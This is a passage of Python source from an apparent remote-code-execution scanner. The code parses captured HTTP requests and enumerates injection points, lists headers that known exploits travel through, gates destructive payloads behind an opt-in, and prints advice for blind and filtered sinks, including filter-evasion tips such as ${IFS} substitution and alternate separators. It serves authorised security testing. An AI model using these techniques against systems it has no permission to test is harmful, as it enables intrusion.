    say nothing, because a verdict capped by a channel that was never live
    reads exactly like a verdict about the target. This is asked outside the
    listener block on purpose: ``deser`` does not require a callback host, so
    it never reaches that block, and a notice placed there could not fire for
    the method that prompted it.

    Takes configured methods rather than their names, because an address only
    strands a method that would have had a callback probe to lose.
    ``--deser-formats php`` has none to begin with, and blaming the address
    there sent the operator after a delegated domain that could not have
    helped."""
    host = str(getattr(args, "oob_host", "") or "").strip().rstrip(".")
    if not host or not OobCallback._is_ip_literal(host):
        return []
    stranded = [m for m in methods
                if m.oob_needs_dns_label and m.builds_callback_probes()]
    if not stranded:
        return []
    # The tier comes off the class. Written out by hand it would say `lookup`
    # confirms, which is the drift this repository keeps finding.
    out_of_reach = sorted({m.tier for m in stranded})
    stranded = [m.name for m in stranded]
    return [f"[!] --methods {'/'.join(stranded)} cannot carry a token in an address: "
            f"{host} is not a name, so the DNS probes are not sent, which puts "
            f"{' / '.join(out_of_reach)} out of reach. Use a domain delegated to this "
            "listener, or read the result as untested rather than clean."]


def method_claim(name: str) -> str:
    """What a method will and will not say, in the words its verdicts use.

    Read from the class, because written out by hand it drifted: the advice
    offered `--methods lookup` as one that "confirms" while the method reported
    `lookup-sink`, in the same list where `oob` and `file` do prove execution.
    A tier that moves has to move in the sentence an operator acts on, and the
    only way to be sure of that is to not write the sentence twice.

    The weaker tiers are named verbatim rather than described. An operator
    reading this is about to run the command and then read the verdict, and the
    string they will see there is the useful thing to print."""
    cls = DETECTION_METHODS[name]
    if cls.tier == EXECUTION_TIER:
        return "proves execution"
    if cls.tier == "needs-review":
        return "reports a candidate only, never execution"
    return "reports %s, NOT execution" % cls.tier


def method_rung_flag(name: str) -> str:
    """The ``--verify-active-risk`` a method needs, or nothing when it is inert."""
    cls = DETECTION_METHODS[name]
    if SAFETY_ORDER.get(cls.safety, 0) <= 0:
        return ""
    return "--verify-active-risk %s" % cls.safety


def blind_sink_advice(method_names: List[str], args: Any) -> List[str]:
    """What to run next when every in-band probe came back negative.

    A sink that returns no output at all cannot be confirmed by a results-based
    method — there is nowhere for the computed value to appear. That is not a
    limitation to work around, it is what 'blind' means. But a run that only
    prints "no execution proven" reads exactly like a clean target, and the
    operator is left to remember unprompted which methods can still reach one.
    So name them, and only the ones not already tried."""
    in_band = {ReflectedMath.name, EvalExpr.name}
    selected = set(method_names)
    if not selected or not selected <= in_band:
        # A blind-capable method already ran; its own verdict stands.
        return []
    lines = ["[detect] A sink that returns NO OUTPUT cannot be confirmed by "
             f"{'/'.join(sorted(selected))} — there is nowhere for the computed value to "
             "appear, so a negative here does not rule out execution. Methods that reach a "
             "blind sink:"]
    # Spell the risk flag out. Advice that names a command the tool then refuses
    # to run is its own small version of the problem this function exists for.
    lines.append(f"[detect]   --methods oob --oob-host HOST {method_rung_flag('oob')}   "
                 f"(needs egress from the target; {method_claim('oob')})")
    lines.append(f"[detect]   --methods lookup --oob-host HOST {method_rung_flag('lookup')}   "
                 "(same listener, for a sink that interpolates ${...} rather than shelling "
                 f"out; {method_claim('lookup')})")
    if not ((getattr(args, "webroot", None) and getattr(args, "web_base_url", None))
            or (getattr(args, "file_write_path", None)
                and getattr(args, "file_read_url", None))):
        # No rung flag here, although `file` is a `stateful` method: naming the
        # directory and the read-back URL *is* its opt-in, and advice that
        # printed a flag the tool does not then require would be its own small
        # version of the problem this function exists for.
        lines.append("[detect]   --methods file --file-write-path DIR --file-read-url URL   "
                     "(needs somewhere writable the target can also read back -- a web root, an "
                     f"LFI endpoint, a download handler; {method_claim('file')})")
    lines.append("[detect]   --methods time                     "
                 f"(no egress and no read-back needed; {method_claim('time')})")
    return lines


def second_order_advice(observe: Optional[Dict[str, Any]],
                        results: List[Dict[str, Any]]) -> List[str]:
    """What to try next when the execution may be happening somewhere else.

    Execution often lands on one request and runs on another -- stored SSTI
    rendered on a profile page, a payload written to a log a template engine
    later renders, a queued job. The response a probe drew shows none of it, so
    every probe reads `negative` however exploitable the target is.

    Measured against a target that stores on one endpoint and renders through a
    shell on another: `--methods time`, `oob`, `lookup` and `file` are all
    `negative` there, because the execution does not happen on the request being
    measured -- and those four were the entire list an operator was given.
    `--observe-url` confirmed it on the first run and was named nowhere.

    Unlike the blind-sink list this is not gated on which methods have run.
    "The execution happens elsewhere" is a possibility no method rules out, so
    the operator who has already tried the expensive ones is exactly the one
    with nothing left to hear.

    What the run *observed* about the input sharpens the sentence without
    deciding it: both readings end at the same flag, so there is no guess here
    that can turn out wrong. Input that comes back and does not execute is a
    reflecting sink; input that comes back at all is not, and a swallowed input
    is equally a blind sink or a stored one -- `ping <input> >/dev/null` returns
    nothing either. Naming both possibilities is the honest answer; picking one
    would be a heuristic."""
    if observe is not None:
        # The operator already named a channel; its own verdict stands, and the
        # run reports separately when it never answered.
        return []
    # Three readings, because only two of them were measured. An aggregate
    # method decides from a series and records no per-probe observation, so a
    # run of `time` alone knows nothing about what came back -- and saying the
    # input was swallowed on that evidence would be the guess this whole
    # function avoids.
    observed = [r["reflected_verbatim"] for r in results if "reflected_verbatim" in r]
    if not observed:
        seen = ("Execution may not be happening on the request being measured at "
                "all. A stored payload rendered on another page, or a queued job, "
                "executes somewhere this run never read.")
    elif any(observed):
        seen = ("The target returned your input verbatim and did not execute it. "
                "If that value is also rendered somewhere else -- a profile page, "
                "a log viewer, an export -- the execution would show there and not "
                "here.")
    else:
        seen = ("The target accepted your input and returned none of it, so this "
                "response cannot show what became of it. A stored payload rendered "
                "on another page, or a queued job, executes somewhere this run "
                "never read.")
    return [
        f"[detect] {seen} Name that endpoint and the same oracle applies to it:",
        "[detect]   --observe-url URL                  (polled after the probes; "
        "differenced against a snapshot taken before any probe was sent)",
        "[detect]   --observe-request FILE             (same, when that page needs "
        "a session)",
    ]


def refused_advice(refused: int, total: int, statuses: Dict[int, int],
                   evade: str, every: bool = False) -> List[str]:
    """What to say when a filter answered instead of the target.

    A run whose probes were refused has learned nothing about the sink, and the
    ordinary "no execution confirmed, the target may be patched" reads as a
    clean bill of health for a target that was never reached. So does the
    blind-sink list, which names methods that will be refused in exactly the
    same way, and the second-order line, which would say the target accepted an
    input it in fact rejected.

    Measured against a real command injection behind a filter that 403s a space
    or a separator: every probe refused, and the run reported `negative=10`.

    ``refused`` and ``total`` are counted in *requests*, matching the status
    tally: an aggregate method fires a whole ladder and reports one row, so
    counting rows here described the same run with different arithmetic and
    hid a partly filtered series entirely. ``every`` comes from the run's
    verdict rather than from a ratio, because that is where "nothing reached
    the sink" is actually decided."""
    if not refused:
        return []
    spelled = ", ".join(f"HTTP {code} x{count}"
                        for code, count in sorted(statuses.items()))
    lines = [
        f"\n[detect] {refused} of {total} probe(s) WERE REFUSED BY A FILTER ({spelled}) "
        "— the payload-free control got through and these did not, so what was "
        "rejected is the payload and the sink never saw it."]
    if every:
        lines.append("[detect] Nothing was put in front of the sink, so this run says "
                     "nothing about whether the target is vulnerable.")
    if evade != "low":
        lines.append("[detect]   --evade low                        (substitutes ${IFS} "
                     "for spaces on Unix shell probes; deliberately minimal)")
    lines.append("[detect]   --separators '&& ,%0a'             (a filter usually keys "
                 "on particular separators; name ones it may not carry)")
    lines.append("[detect]   --encodings ...                    (see --doctor for the "
                 "corpus encodings, for a filter that inspects the raw value)")
    return lines


def partition_destructive(records: Iterator[PayloadRecord],
                          allow_destructive: bool) -> Tuple[List[PayloadRecord], int]:
    """Materialise ``records``, holding back the ones that alter or damage the
    target -- persistence, backdoors, security-control tampering, irreversible
    file operations -- unless the operator opted in. Returns ``(to_send,
    held_back)``.

    Both live paths go through this. The single-request verifier held these
    back while the multi-step chain did not, so a payload the one refused to
    fire the other would install; the safety of a run must not depend on which
    delivery path it took."""
    to_send: List[PayloadRecord] = []
    held_back = 0
    for record in records:
        if record.destructive and not allow_destructive:
            held_back += 1
            continue
        to_send.append(record)
    return to_send, held_back


def build_verification_plan(records: List[PayloadRecord], method: str, url: str,
                            attacker_ip: Optional[str] = None,
                            attacker_domain: Optional[str] = None,
                            max_payloads: Optional[int] = None):
    """Summarise what a verification run will send *before* anything is fired,
    so a high-impact set is never sent silently. Returns ``(lines, to_send)``
    where ``to_send`` is the deduplicated, capped record list actually sent."""
    to_send: List[PayloadRecord] = []
    seen: Set[str] = set()
    for record in records:
        if record.payload in seen:
            continue
        seen.add(record.payload)
        to_send.append(record)
    if max_payloads:
        to_send = to_send[:max_payloads]

    by_safety: Dict[str, int] = {}
    high_risk: Dict[str, int] = {}
    destinations: Set[str] = set()
    for record in to_send:
        by_safety[record.safety] = by_safety.get(record.safety, 0) + 1
        if record.category in HIGH_RISK_CATEGORIES:
            high_risk[record.category] = high_risk.get(record.category, 0) + 1
        if record.oob_host:
            destinations.add(record.oob_host.split(".", 1)[-1] if "." in record.oob_host else record.oob_host)
        if attacker_ip and attacker_ip in record.payload:
            destinations.add(attacker_ip)
        if attacker_domain and attacker_domain in record.payload:
            destinations.add(attacker_domain)

    lines = [
        f"[plan] {method} {url}",
        f"[plan] {len(to_send)} unique payloads to send"
        + (f" (capped at --max-payloads {max_payloads})" if max_payloads else ""),
        "[plan] safety tiers: " + (", ".join(f"{k}={v}" for k, v in sorted(by_safety.items())) or "none"),
    ]
    if high_risk:
        lines.append("[plan] HIGH-IMPACT categories: "
                     + ", ".join(f"{k}={v}" for k, v in sorted(high_risk.items())))
    if destinations:
        lines.append("[plan] network / out-of-band callback destinations: "
                     + ", ".join(sorted(destinations)))
    return lines, to_send


# ===========================================================================
# Raw HTTP request input (`-r`)
#
# Parse a captured HTTP request and place the FUZZ marker at a chosen injection
# point, then hand the resulting (url, method, data, headers) to the existing
# verify/detect engine. Each injection point is encoded downstream for the
# context it lands in (query / form / JSON / header / cookie), reusing the same
# per-location escaping every other payload goes through.
# ===========================================================================

def parse_raw_request(text: str) -> Dict[str, Any]:
    """Split a raw HTTP request (request line, headers, blank line, optional
    body) into its parts. Returns ``method``, ``target`` (path?query),
    ``version``, ``headers`` (ordered ``[name, value]`` pairs), ``body``, and
    ``host`` (from the Host header)."""
    text = text.replace("\r\n", "\n").replace("\r", "\n")
    head, _, body = text.partition("\n\n")
    # A raw request saved to a file (an editor or a heredoc) almost always gains a
    # trailing newline, which partition() leaves on the body — silently corrupting
    # the last body parameter: `...&new2=test2\n` makes new2 != test2 and can break
    # the submission. HTTP bodies never require a trailing newline, so drop any;
    # internal newlines (multi-line / multipart bodies) are left untouched.
    body = body.rstrip("\n")
    lines = head.split("\n")
    while lines and not lines[0].strip():
        lines.pop(0)
    if not lines:
        raise ValueError("empty request")
    parts = lines[0].split()
    if len(parts) < 2:
        raise ValueError(f"malformed request line: {lines[0]!r}")
    method, target = parts[0], parts[1]
    version = parts[2] if len(parts) > 2 else "HTTP/1.1"
    headers: List[List[str]] = []
    host = ""
    for line in lines[1:]:
        if not line.strip():
            continue
        name, sep, value = line.partition(":")
        if not sep:
            continue
        name, value = name.strip(), value.strip()
        headers.append([name, value])
        if name.lower() == "host":
            host = value
    return {"method": method, "target": target, "version": version,
            "headers": headers, "body": body, "host": host}


@dataclass(frozen=True)
class InjectionPoint:
    """One place in a captured request where a payload could be injected.

    ``kind`` picks the placement rule (and therefore the encoding), ``name`` is
    the addressable identifier within that kind — a parameter name, a JSON path
    like ``user.profile.name``, a header name, a path-segment index — and
    ``label`` is what a finding calls it.

    For a JSON point and a multipart point alike, ``tokens`` is the authority
    and ``name`` is only for reading. A dotted string cannot round-trip a key that itself contains a dot:
    ``{"user.name": ..., "user": {"name": ...}}`` renders both leaves as
    ``user.name``, so the literal key is never probed and any finding is
    attributed to the nested one. Addressing by tokens removes the ambiguity;
    ``name`` renders a dotted key as ``["user.name"]`` so the two stay
    distinguishable on screen too.

    A multipart point carries its part index for the same reason. Repeated
    field names are ordinary -- a multi-file input and a checkbox array both
    post several parts under one name -- and addressing by name alone rewrites
    the first of them every time, so the later parts are counted as covered
    and never tested."""
    kind: str
    name: str
    label: str
    tokens: Tuple[Any, ...] = ()


# Headers worth trying before the rest. Not a guess: each is a header that
# real, published RCEs inject through -- Shellshock rides User-Agent and
# Referer, Struts2 S2-045 rides Content-Type, Spring Cloud Function rides a
# routing-expression header, and X-Forwarded-For lands in log pipelines and
# admin views that later render it.
HIGH_YIELD_HEADERS = ("User-Agent", "Referer", "X-Forwarded-For", "Content-Type",
                      "Accept-Language", "X-Api-Version", "X-Forwarded-Host",
                      "spring.cloud.function.routing-expression")

# Headers a probe must not touch. Hop-by-hop headers belong to the connection
# rather than the application, and Host/Content-Length are rebuilt by the
# delivery layer -- injecting into them changes the request's plumbing instead
# of testing the app. Cookie is excluded because its crumbs are enumerated
# individually, which is the addressable unit an application actually reads.
NON_INJECTABLE_HEADERS = {
    "host", "content-length", "connection", "keep-alive", "proxy-authenticate",
    "proxy-authorization", "te", "trailer", "transfer-encoding", "upgrade", "cookie",
}

# The candidate kinds, in the order they are tried.
INJECTION_POINT_KINDS = ("query", "json", "xml", "form", "multipart", "cookie", "header", "path")

# What a finding calls each shape of XML value. The span's kind also picks the
# escaping, so the noun and the encoder stay in step.
_XML_POINT_NOUNS = {"text": "element", "attr": "attribute", "cdata": "CDATA"}

# A part's name in its Content-Disposition line. Quoted form only: RFC 7578
# requires the quotes, and every library that writes a multipart body emits
# them.
_MULTIPART_NAME_RE = re.compile(r'name\s*=\s*"((?:[^"\\]|\\.)*)"')

# The fields a GraphQL request uses to carry the operation itself rather than
# the arguments it is called with.
GRAPHQL_STRUCTURAL_FIELDS = ("query", "operationName")

# What a GraphQL document opens with: the shorthand ``{ ... }``, or an
# operation or fragment keyword, after any leading comments. Carrying both keys
# is not enough on its own -- a search API posting
# ``{"query": "red shoes", "variables": {...}}`` has a real injection point in
# `query`, and demoting it there is a point a bounded run can drop entirely.
_GRAPHQL_DOC_RE = re.compile(
    r"^(?:\s*#[^\n]*\n)*\s*(?:\{|(?:query|mutation|subscription|fragment)\b)")


def _looks_like_graphql(document: str) -> bool:
    """Whether a ``query`` string is a GraphQL document rather than a search
    term. A selection set is required, so a bare keyword does not qualify."""
    return bool(_GRAPHQL_DOC_RE.match(document)) and "{" in document


def _is_multipart_body(headers: List[List[str]]) -> bool:
    """Whether the request declares a ``multipart/form-data`` body."""
    for name, value in headers:
        if name.lower() == "content-type":
            return "multipart/form-data" in value.lower()
    return False


def _multipart_boundary(headers: List[List[str]], body: str = "") -> Optional[str]:
    """The delimiter separating the parts, from Content-Type or from the body.

    The header is authoritative. The body's first line is the same string and
    settles the case where a capture reached RCEKit without the parameter."""
    for name, value in headers:
        if name.lower() != "content-type":
            continue
        for chunk in value.split(";")[1:]:
            key, sep, raw = chunk.strip().partition("=")
            if sep and key.strip().lower() == "boundary":
                found = raw.strip().strip('"')
                if found:
                    return found
    first = (body or "").split("\n", 1)[0].rstrip("\r")
    return first[2:] if first.startswith("--") and len(first) > 2 else None


def _split_multipart(body: str, boundary: str) -> Optional[List[List[str]]]:
    """``[part_headers, content]`` for each part, in order. None if it does not
    parse against this boundary.

    The preamble and epilogue are dropped. They are advisory text for clients
    that cannot read MIME, and no part of what the application receives."""
    delim = "--" + boundary
    segments = (body or "").split(delim)
    if len(segments) < 2:
        return None
    parts: List[List[str]] = []
    closed = False
    for segment in segments[1:]:
        if segment.startswith("--"):
            closed = True
            break
        if segment.startswith("\r\n"):
            segment = segment[2:]
        elif segment.startswith("\n"):
            segment = segment[1:]
        else:
            return None
        head, sep, content = segment.partition("\r\n\r\n")
        if not sep:
            head, sep, content = segment.partition("\n\n")
        if not sep:
            return None
        if content.endswith("\r\n"):
            content = content[:-2]
        elif content.endswith("\n"):
            content = content[:-1]
        parts.append([head, content])
    return parts if closed and parts else None


def _multipart_field_name(head: str) -> Optional[str]:
    """The form field a part carries, from its Content-Disposition line."""
    for line in head.replace("\r\n", "\n").split("\n"):
        name, sep, value = line.partition(":")
        if sep and name.strip().lower() == "content-disposition":
            match = _MULTIPART_NAME_RE.search(value)
            if match:
                return match.group(1)
    return None


def _render_multipart(parts: List[List[str]], boundary: str) -> str:
    """Re-serialise parsed parts with CRLF delimiters and CRLF part headers.

    That is what RFC 2046 requires and what a capture no longer has:
    ``parse_raw_request`` normalises the whole request to LF, so a multipart
    body read back from a file has lost the line endings it was sent with.
    Part *content* is left character for character, so a lone newline inside an
    uploaded text file survives.

    Every request for a multipart point is rendered here -- the payload-free
    control as much as the probe -- so the two differ in the field under test
    and in nothing else, which is what the control has to hold constant."""
    delim = "--" + boundary
    out: List[str] = []
    for head, content in parts:
        canonical = "\r\n".join(head.replace("\r\n", "\n").split("\n"))
        out.append(f"{delim}\r\n{canonical}\r\n\r\n{content}\r\n")
    out.append(f"{delim}--\r\n")
    return "".join(out)


# An XML/SOAP body is scanned for value spans and rewritten by *offset*, never
# parsed and re-emitted. Two reasons, and the second is the load-bearing one.
#
# A captured envelope may be signed (WS-Security / XML-DSig), and then every
# byte outside the value under test has to survive. Parse-then-re-emit loses
# attribute order, insignificant whitespace and the prolog's quoting style,
# none of which an XML document is required to preserve and all of which a
# digest covers. Offsets leave the rest of the capture byte for byte.
#
# And a capture aimed at an XXE sink carries a DOCTYPE with an external entity,
# because that is what the operator is trying to prove the *target* resolves.
# A real parser resolves it here instead, which turns the tool into the thing
# it is testing for. A scanner never interprets an entity, so there is nothing
# to resolve, no billion laughs to expand, and no retrieval to disable.
_XML_TAG_RE = re.compile(r"<(/?)([A-Za-z_][\w:.-]*)((?:\"[^\"]*\"|'[^']*'|[^>\"'])*?)(/?)>", re.S)
_XML_ATTR_RE = re.compile(r"([A-Za-z_][\w:.-]*)\s*=\s*(?:\"([^\"]*)\"|'([^']*)')")

# The XML-DSig namespace. A `Signature` element *in* it means a rewrite
# anywhere in the document invalidates a digest, so every probe would come back
# refused for a reason that has nothing to do with the sink -- which reads
# exactly like a filter.
_XML_DSIG_NS = "http://www.w3.org/2000/09/xmldsig#"

# A namespace declaration and the URI it binds, in either quoting style.
_XML_NS_DECL_RE = re.compile(
    r"(xmlns(?::[A-Za-z_][\w.-]*)?)\s*=\s*(?:\"([^\"]*)\"|'([^']*)')")

# A UTF-8 byte-order mark. `str.strip()` does not remove it -- U+FEFF is not
# whitespace -- so a capture that carries one reads as "not XML" to a test on
# the first character. .NET clients emit one routinely, and the cost of missing
# it is not a missed point but the wrong branch: a body with a prolog contains
# `=`, so it lands in the form branch and produces the single bogus point that
# the xml branch exists to replace.
_XML_BOM = "\ufeff"

# Spans per body, matching the JSON leaf cap for the same reason: a generated
# document can carry thousands, and a bounded run that spends its whole budget
# on one envelope has tested one request.
_XML_SPAN_LIMIT = 256


def starts_xml_body(stripped: str) -> bool:
    """Whether a stripped body opens an XML document, byte-order mark and all.

    One predicate for the two places that ask -- the enumerator's branch and
    the body-location detector -- because the two of them disagreeing is how a
    body gets enumerated as XML and then escaped as something else."""
    return stripped.lstrip(_XML_BOM)[:1] == "<"


def xml_body_is_signed(body: str) -> bool:
    """Whether this body carries an XML signature, and so cannot be rewritten.

    Both halves are required: an element named ``Signature`` **and** a prefix
    bound to the XML-DSig namespace. Neither alone is the question.
    ``<Signature>`` is an ordinary element in plenty of schemas, so the name
    cannot decide it; and the namespace URI on its own appears wherever a schema
    predeclares the prefix without signing anything -- or in a comment, or in
    text content. Reading the URI alone suppressed every point in such a
    document, so a testable request reported that there was nothing to test,
    which is the one outcome this tool refuses to produce.

    A declaration is treated as binding for the whole document rather than for
    the subtree it sits in. That is not what XML says, and it is the cautious
    direction for a guard: it can only make this answer ``True`` more readily,
    and a document that both binds a prefix to DSig and carries an element of
    that name under it is signed outside of a deliberately pathological
    rebinding. A scanner, for the reasons in the note above this block --
    there is still no parser here, and nothing resolves an entity."""
    text = body or ""
    if _XML_DSIG_NS not in text:
        return False
    prefixes = set()
    default_bound = False
    for decl in _XML_NS_DECL_RE.finditer(text):
        uri = decl.group(2) if decl.group(2) is not None else decl.group(3)
        if uri != _XML_DSIG_NS:
            continue
        _xmlns, _sep, prefix = decl.group(1).partition(":")
        if prefix:
            prefixes.add(prefix)
        else:
            default_bound = True
    if not prefixes and not default_bound:
        return False
    for tag in _XML_TAG_RE.finditer(text):
        if tag.group(1):
            continue
        prefix, sep, local = tag.group(2).partition(":")
        if (local if sep else prefix) != "Signature":
            continue
        bound = prefix in prefixes if sep else default_bound
        if bound:
            return True
    return False


def _xml_value_spans(body: str) -> List[Tuple[str, str, int, int]]:
    """Every injectable value in an XML body as ``(kind, path, start, end)``.

    ``kind`` is ``text``, ``attr`` or ``cdata`` and decides the escaping the
    payload needs; ``start``/``end`` bound the value's bytes in ``body`` and are
    the authority, exactly as ``tokens`` is for a JSON leaf. ``path`` is for
    reading.

    A sibling repeated under one parent is indexed from the second occurrence
    (``item``, ``item[2]``, ``item[3]``) rather than from the first, which is
    how a repeated multipart field is labelled too. The asymmetry is cosmetic
    because the offsets address the span; naming every element ``a[1]/b[1]``
    to be uniform would make the common document unreadable.

    ``xmlns`` declarations are not candidates: a payload in a namespace URI
    renames the element rather than reaching anything that reads its value.

    An element with no element children yields a span even when its value is
    empty or only whitespace: ``<cmd></cmd>`` and ``<cmd>   </cmd>`` are the
    ordinary shape of a field in a SOAP template, and a JSON ``""`` leaf and a
    form ``key=`` are both candidates already. Whitespace between two
    *elements* is still formatting and yields nothing, which is why the test is
    "did this element have an element child" rather than "is this text blank" --
    the latter answers the same for a placeholder field and for the indentation
    of a pretty-printed envelope.

    A self-closing ``<cmd/>`` is not a candidate, for the reason
    :func:`_set_json_tokens` refuses to create a key that was not there: it has
    no text node, so rewriting it as ``<cmd>payload</cmd>`` would test a shape
    the application never sends.

    Never raises. The input is a capture the operator supplied, and a document
    that does not close a tag is still the one carrying the sink."""
    spans: List[Tuple[str, str, int, int]] = []
    # Per open element: its name, its sibling-indexed label, where its content
    # begins, whether an element child has appeared inside it, and whether a
    # text span has already been emitted for it.
    stack: List[List[Any]] = []
    counts: List[Dict[str, int]] = [{}]
    pos, length = 0, len(body or "")

    def path_of(extra: Optional[str] = None) -> str:
        names = [entry[1] for entry in stack]
        if extra is not None:
            names.append(extra)
        return "/".join(names)

    while pos < length and len(spans) < _XML_SPAN_LIMIT:
        lt = body.find("<", pos)
        if lt < 0:
            break
        if lt > pos and stack:
            # Character data belongs to whichever element is open. Blank runs
            # are left to the closing tag, which knows whether this element has
            # children and so whether the run is a value or indentation.
            if body[pos:lt].strip():
                spans.append(("text", path_of(), pos, lt))
                stack[-1][4] = True
        if body.startswith("<!--", lt):
            end = body.find("-->", lt + 4)
            pos = length if end < 0 else end + 3
            continue
        if body.startswith("<![CDATA[", lt):
            end = body.find("]]>", lt + 9)
            if end < 0:
                break
            if stack:
                spans.append(("cdata", path_of() + "/cdata()", lt + 9, end))
                # A CDATA section is this element's value, so the closing tag
                # must not add an empty one beside it.
                stack[-1][4] = True
            pos = end + 3
            continue
        if body.startswith("<?", lt) or body.startswith("<!", lt):
            # Prolog, DOCTYPE or processing instruction, skipped whole. A
            # DOCTYPE with an internal subset carries `>` inside the brackets
            # -- every entity declaration ends with one -- so the first `>` is
            # not the end of it. The bracket has to be opened before the first
            # `>` to count: searching the rest of the document for `]>` instead
            # finds the one inside a later `]]>` and swallows the body with it.
            end = body.find(">", lt + 2)
            if body.startswith("<!DOCTYPE", lt) and 0 <= body.find("[", lt + 9) < (
                    end if end >= 0 else length):
                closed = body.find("]", body.find("[", lt + 9))
                end = body.find(">", closed) if closed >= 0 else end
            pos = length if end < 0 else end + 1
            continue
        match = _XML_TAG_RE.match(body, lt)
        if match is None:
            # A bare `<` in character data, or a tag the scanner cannot read.
            pos = lt + 1
            continue
        closing, name, attrs, self_closing = (match.group(1), match.group(2),
                                              match.group(3) or "", match.group(4))
        if closing:
            if stack and stack[-1][0] == name:
                _n, _label, content_start, had_child, emitted = stack[-1]
                if not had_child and not emitted:
                    # A leaf whose value is empty or whitespace. The span may be
                    # zero-length -- `<cmd></cmd>` -- and that is the right
                    # answer: placement splices at the offsets, so the payload
                    # lands between the tags where the application reads it.
                    spans.append(("text", path_of(), content_start, lt))
                stack.pop()
                counts.pop()
            pos = match.end()
            continue
        siblings = counts[-1]
        siblings[name] = siblings.get(name, 0) + 1
        label = name if siblings[name] == 1 else f"{name}[{siblings[name]}]"
        if stack:
            stack[-1][3] = True
        for attr in _XML_ATTR_RE.finditer(attrs):
            attr_name = attr.group(1)
            if attr_name == "xmlns" or attr_name.startswith("xmlns:"):
                continue
            group = 2 if attr.group(2) is not None else 3
            spans.append(("attr", path_of(label) + f"/@{attr_name}",
                          match.start(3) + attr.start(group),
                          match.start(3) + attr.end(group)))
            if len(spans) >= _XML_SPAN_LIMIT:
                break
        if not self_closing:
            stack.append([name, label, match.end(), False, False])
            counts.append({})
        pos = match.end()
    return spans[:_XML_SPAN_LIMIT]


def _order_graphql_leaves(parsed: Any,
                          leaves: List[Tuple[Any, ...]]) -> List[Tuple[Any, ...]]:
    """Move a GraphQL request's structural fields behind the arguments.

    A GraphQL POST carries ``variables`` -- the values the operation is called
    with, which reach resolvers and so reach sinks -- alongside ``query``, the
    operation document itself. A payload in ``query`` *replaces* that document,
    so the server answers with a parse error before any resolver runs, and
    ``operationName`` has to name an operation in the document it no longer
    matches. Each is a full probe ladder spent where nothing can be confirmed,
    and on the capture this was measured against they were two points of five.

    They are moved, not dropped. A server that logs the query document before
    parsing it is reachable through exactly that field, which is how Log4Shell
    travelled through access logs, so a full run still tests them -- and
    ``--max-points`` now cuts the least likely to pay first rather than
    whichever came last in the document."""
    if not isinstance(parsed, dict) or not isinstance(parsed.get("query"), str):
        return leaves
    if "variables" not in parsed and "operationName" not in parsed:
        # A lone `{"query": ...}` is as likely to be a search API as a GraphQL
        # endpoint, and there the query field is the one worth testing.
        return leaves
    if not _looks_like_graphql(parsed["query"]):
        # The keys alone do not make it GraphQL. A search API can carry both,
        # and demoting a real injection point there is one a bounded
        # `--max-points` run drops outright.
        return leaves
    structural = [t for t in leaves
                  if len(t) == 1 and t[0] in GRAPHQL_STRUCTURAL_FIELDS]
    if not structural:
        return leaves
    return [t for t in leaves if t not in structural] + structural


def _render_json_path(tokens: Tuple[Any, ...]) -> str:
    """A readable rendering of a token address.

    ``('user','profile','name')`` -> ``user.profile.name``; ``('items',0,'v')``
    -> ``items[0].v``. A key that itself contains ``.``, ``[`` or ``]`` is
    bracket-quoted — ``('user.name',)`` -> ``["user.name"]`` — so it can never
    be read as the nested path of the same spelling."""
    parts: List[str] = []
    for token in tokens:
        if isinstance(token, int):
            parts.append(f"[{token}]")
        elif any(ch in token for ch in ".[]"):
            parts.append('["' + token.replace('"', '\\"') + '"]')
        else:
            parts.append(f".{token}" if parts else token)
    rendered = "".join(parts)
    return rendered[1:] if rendered.startswith(".") else rendered


def _json_leaf_tokens(obj: Any, limit: int = 256,
                      max_depth: int = 64) -> List[Tuple[Any, ...]]:
    """Token addresses of every scalar leaf of a parsed JSON body, in document
    order.

    Tokens rather than a joined string, because a string cannot round-trip a key
    containing the separator. Iterative and bounded for the same reason the
    response-channel walk is: a pathological body must cost a bounded amount of
    work, not a RecursionError in the middle of a run."""
    leaves: List[Tuple[Any, ...]] = []
    stack: List[Tuple[Any, Tuple[Any, ...], int]] = [(obj, (), 0)]
    while stack and len(leaves) < limit:
        node, path, depth = stack.pop()
        if depth > max_depth:
            continue
        if isinstance(node, dict):
            for key in reversed(list(node.keys())):
                stack.append((node[key], path + (key,), depth + 1))
        elif isinstance(node, list):
            for index in range(len(node) - 1, -1, -1):
                stack.append((node[index], path + (index,), depth + 1))
        elif isinstance(node, str) or isinstance(node, (int, float)) and not isinstance(node, bool):
            if path:
                leaves.append(path)
    return leaves


def _set_json_tokens(obj: Any, tokens: Tuple[Any, ...], value: str) -> bool:
    """Set the leaf at ``tokens`` to ``value`` in place. False if it is not there.

    Replaces an existing leaf only — assigning to a dict would otherwise *create*
    a key the application never sends, which tests a field that does not exist
    and cannot say anything about the one that does."""
    if not tokens:
        return False
    node = obj
    for token in tokens[:-1]:
        if isinstance(node, dict):
            if token not in node:
                return False
            node = node[token]
        elif isinstance(node, list):
            if not isinstance(token, int) or not 0 <= token < len(node):
                return False
            node = node[token]
        else:
            return False
    leaf = tokens[-1]
    if isinstance(node, dict):
        if leaf not in node:
            return False
    elif isinstance(node, list):
        if not isinstance(leaf, int) or not 0 <= leaf < len(node):
            return False
    else:
        return False
    node[leaf] = value
    return True


def enumerate_injection_points(req: Dict[str, Any], kinds: Optional[Tuple[str, ...]] = None,
                               include_path_segments: bool = False,
                               thorough: bool = False) -> List[InjectionPoint]:
    """Every candidate injection point in a captured request, cheapest first.

    ``-p NAME`` requires the tester to already know which parameter is the sink.
    Real captures carry ten to forty candidates, and some of the highest-value
    classes inject through a *header* -- Shellshock through ``User-Agent``,
    Struts2 S2-045 through ``Content-Type`` -- or through a JSON leaf several
    levels down, which no top-level parameter name addresses.

    Order is by expected yield per request: query, then body (JSON leaves by
    path, or form fields), then cookies, then headers. Path segments are last
    and opt-in: rewriting a path segment often just produces a 404, which costs
    a request and tells you nothing.

    ``thorough`` adds the remaining non-hop-by-hop headers after the curated
    ones; without it only the high-yield list is tried."""
    selected = set(kinds or INJECTION_POINT_KINDS)
    points: List[InjectionPoint] = []
    target, headers, body = req["target"], req["headers"], req.get("body", "")

    if "query" in selected:
        _, _, query = target.partition("?")
        for pair in query.split("&") if query else []:
            key, sep, _ = pair.partition("=")
            if sep and key:
                points.append(InjectionPoint("query", key, f"query param '{key}'"))

    stripped = (body or "").strip()
    if _is_multipart_body(headers):
        # Decided from Content-Type, and decided before the form branch, which
        # used to split a multipart body on `&` and yield a single point named
        # after a Content-Disposition line. That point could not confirm
        # anything -- every probe rewrote a part header -- while the fields the
        # form actually posts were never tested. A run that reports coverage it
        # does not have is worse than one that reports none.
